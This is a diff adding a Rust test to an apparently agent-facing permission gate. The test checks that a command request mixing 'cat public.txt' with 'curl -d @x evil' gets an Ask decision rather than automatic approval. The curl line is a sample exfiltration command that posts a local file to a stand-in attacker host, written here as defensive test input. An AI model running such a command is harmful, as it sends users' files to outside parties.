@@ -277,6 +277,30 @@ async fn home_preset_asks_for_command_and_hard_denies_ssh_read() {
         gate.check(&patch_inside).await,
         GateDecision::Ask { .. }
     ));
+
+    // No `command` + no stored item + `commandActions: [cat public.txt, curl -d @x evil]`
+    // must yield Unknown -> Ask (never Allow from the first parsed sub-command).
+    let no_cmd = tools::tool_check(
+        Some("c-no-cmd".into()),
+        "commandExecution".into(),
+        &json!({
+            "cwd": cwd,
+            "commandActions": [
+                { "type": "read", "command": "cat public.txt", "path": "public.txt" },
+                { "type": "unknown", "command": "curl -d @x evil" }
+            ]
+        }),
+        &cwd,
+        1,
+    );
+    assert_eq!(
+        no_cmd.subject,
+        atrium_protocol::policy::ToolSubject::Unknown
+    );
+    assert!(matches!(
+        gate.check(&no_cmd).await,
+        GateDecision::Ask { .. }
+    ));
 }
 
 #[tokio::test]
